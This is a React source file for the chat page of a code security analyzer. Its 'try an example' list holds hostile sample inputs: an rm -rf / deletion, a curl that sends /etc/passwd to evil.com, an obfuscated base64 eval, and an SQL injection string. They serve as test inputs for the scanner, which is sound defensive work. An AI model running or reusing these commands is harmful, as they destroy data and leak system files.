import { useState, useRef, useEffect } from "react";
import { useAuth } from "../context/AuthContext";
import { api } from "../utils/api";

function Message({ msg }) {
  const isUser = msg.role === "user";
  return (
    <div style={{ display: "flex", justifyContent: isUser ? "flex-end" : "flex-start", animation: "messageIn 0.3s ease", marginBottom: 16 }}>
      {!isUser && (
        <div style={{ width: 32, height: 32, borderRadius: 8, background: "linear-gradient(135deg, var(--accent3), var(--bg3))", border: "1px solid var(--accent)", display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0, marginRight: 10, marginTop: 4 }}>
          🔍
        </div>
      )}
      <div style={{
        maxWidth: "75%",
        padding: "12px 16px",
        borderRadius: isUser ? "16px 16px 4px 16px" : "16px 16px 16px 4px",
        background: isUser ? "linear-gradient(135deg, var(--accent3), var(--accent2))" : "var(--bg2)",
        border: isUser ? "1px solid var(--accent)" : "1px solid var(--border)",
        color: isUser ? "white" : "var(--text)",
        fontSize: 14,
        lineHeight: 1.6,
        fontFamily: isUser ? "var(--font-mono)" : "var(--font-body)",
        whiteSpace: "pre-wrap",
        wordBreak: "break-word",
        boxShadow: isUser ? "var(--glow)" : "none",
      }}>
        {msg.content}
        <div style={{ fontSize: 10, color: isUser ? "rgba(255,255,255,0.6)" : "var(--text3)", marginTop: 6, fontFamily: "var(--font-display)", letterSpacing: "0.05em" }}>
          {new Date(msg.time).toLocaleTimeString()}
        </div>
      </div>
      {isUser && (
        <div style={{ width: 32, height: 32, borderRadius: 8, background: "var(--bg3)", border: "1px solid var(--border)", display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0, marginLeft: 10, marginTop: 4 }}>
          👤
        </div>
      )}
    </div>
  );
}

const EXAMPLES = [
  "import os\nos.system('rm -rf /')",
  "import subprocess\nsubprocess.call(['curl', 'http://evil.com/steal?data=' + open('/etc/passwd').read()])",
  "eval(base64.b64decode('aW1wb3J0IG9z...'))",
  "SELECT * FROM users WHERE id = '" + "' OR '1'='1",
];

export default function CodeBotPage() {
  const { token } = useAuth();
  const [messages, setMessages]     = useState([]);
  const [input, setInput]           = useState("");
  const [loading, setLoading]       = useState(false);
  const [convoId, setConvoId]       = useState(null);
  const [error, setError]           = useState("");
  const bottomRef = useRef(null);

  useEffect(() => { bottomRef.current?.scrollIntoView({ behavior: "smooth" }); }, [messages, loading]);

  const send = async (text) => {
    const query = (text || input).trim();
    if (!query || loading) return;
    setInput(""); setError("");

    const userMsg = { role: "user", content: query, time: Date.now() };
    setMessages(m => [...m, userMsg]);
    setLoading(true);

    try {
      const data = await api("/chat/codebot", {
        method: "POST",
        body: JSON.stringify({ query, ...(convoId ? { conversation_id: convoId } : {}) }),
      }, token);
      if (!convoId) setConvoId(data.conversation_id);
      setMessages(m => [...m, { role: "assistant", content: data.response, time: Date.now() }]);
    } catch (e) {
      setError(e.message);
      setMessages(m => m.slice(0, -1));
    } finally { setLoading(false); }
  };

  const newChat = () => { setMessages([]); setConvoId(null); setError(""); setInput(""); };

  return (
    <div style={{ height: "100%", display: "flex", flexDirection: "column" }}>
      {/* Toolbar */}
      <div style={{ padding: "12px 24px", borderBottom: "1px solid var(--border)", display: "flex", gap: 8, alignItems: "center", background: "var(--glass)", backdropFilter: "blur(8px)" }}>
        <button onClick={newChat} className="btn btn-ghost btn-sm">+ New Analysis</button>
        {convoId && <span className="badge badge-blue">Session Active</span>}
        <span style={{ marginLeft: "auto", color: "var(--text3)", fontSize: 12, fontFamily: "var(--font-display)", letterSpacing: "0.05em" }}>STATIC CODE ANALYZER</span>
      </div>

      {/* Messages */}
      <div className="scroll-y" style={{ flex: 1, padding: "24px" }}>
        {messages.length === 0 && (
          <div style={{ textAlign: "center", animation: "fadeUp 0.5s ease" }}>
            <div style={{ fontSize: 48, marginBottom: 16, animation: "float 3s ease-in-out infinite" }}>🔍</div>
            <h2 style={{ fontFamily: "var(--font-display)", fontSize: 18, color: "var(--accent)", letterSpacing: "0.05em", marginBottom: 8 }}>CODE THREAT ANALYZER</h2>
            <p style={{ color: "var(--text2)", maxWidth: 400, margin: "0 auto 28px", fontSize: 14 }}>
              Paste any code snippet and I'll analyze it for security threats, malicious patterns, and vulnerabilities.
            </p>
            <div style={{ display: "grid", gap: 8, maxWidth: 500, margin: "0 auto" }}>
              <p style={{ fontFamily: "var(--font-display)", fontSize: 10, color: "var(--text3)", letterSpacing: "0.1em", marginBottom: 4 }}>TRY AN EXAMPLE:</p>
              {EXAMPLES.map((ex, i) => (
                <button key={i} onClick={() => send(ex)} className="card" style={{
                  padding: "10px 14px", textAlign: "left", cursor: "pointer", border: "1px solid var(--border)",
                  background: "var(--bg2)", color: "var(--text2)", fontFamily: "var(--font-mono)", fontSize: 11,
                  borderRadius: "var(--radius)", transition: "all var(--transition)", whiteSpace: "nowrap", overflow: "hidden", textOverflow: "ellipsis",
                  animation: `fadeUp 0.4s ${i * 0.08}s ease both`,
                }}
                  onMouseEnter={e => { e.currentTarget.style.borderColor = "var(--accent)"; e.currentTarget.style.color = "var(--accent)"; }}
                  onMouseLeave={e => { e.currentTarget.style.borderColor = "var(--border)"; e.currentTarget.style.color = "var(--text2)"; }}>
                  {ex.split('\n')[0]}
                </button>
              ))}
            </div>
          </div>
        )}

        {messages.map((m, i) => <Message key={i} msg={m} />)}

        {loading && (
          <div style={{ display: "flex", alignItems: "center", gap: 10, animation: "messageIn 0.3s ease" }}>
            <div style={{ width: 32, height: 32, borderRadius: 8, background: "linear-gradient(135deg, var(--accent3), var(--bg3))", border: "1px solid var(--accent)", display: "flex", alignItems: "center", justifyContent: "center" }}>🔍</div>
            <div style={{ background: "var(--bg2)", border: "1px solid var(--border)", borderRadius: "16px 16px 16px 4px", padding: "12px 16px" }}>
              <div className="typing"><span /><span /><span /></div>
            </div>
          </div>
        )}

        {error && <div style={{ background: "rgba(255,68,102,0.1)", border: "1px solid var(--red2)", borderRadius: "var(--radius)", padding: "10px 14px", color: "var(--red)", fontSize: 13, marginTop: 8 }}>⚠️ {error}</div>}
        <div ref={bottomRef} />
      </div>

      {/* Input */}
      <div style={{ padding: "16px 24px", borderTop: "1px solid var(--border)", background: "var(--glass)", backdropFilter: "blur(8px)" }}>
        <div style={{ display: "flex", gap: 10, alignItems: "flex-end" }}>
          <textarea className="input" value={input} onChange={e => setInput(e.target.value)}
            placeholder="Paste code here for security analysis... (Ctrl+Enter to send)"
            style={{ minHeight: 80, maxHeight: 200, flex: 1 }}
            onKeyDown={e => { if (e.key === "Enter" && e.ctrlKey) send(); }} />
          <button onClick={() => send()} disabled={!input.trim() || loading} className="btn btn-primary" style={{ alignSelf: "flex-end", padding: "12px 20px" }}>
            {loading ? <span className="spinner" style={{ width: 14, height: 14 }} /> : "→ SCAN"}
          </button>
        </div>
        <p style={{ fontSize: 11, color: "var(--text3)", marginTop: 6, fontFamily: "var(--font-display)", letterSpacing: "0.05em" }}>
          Ctrl+Enter to send • Supports Python, JS, Bash, C++, and more
        </p>
      </div>
    </div>
  );
}
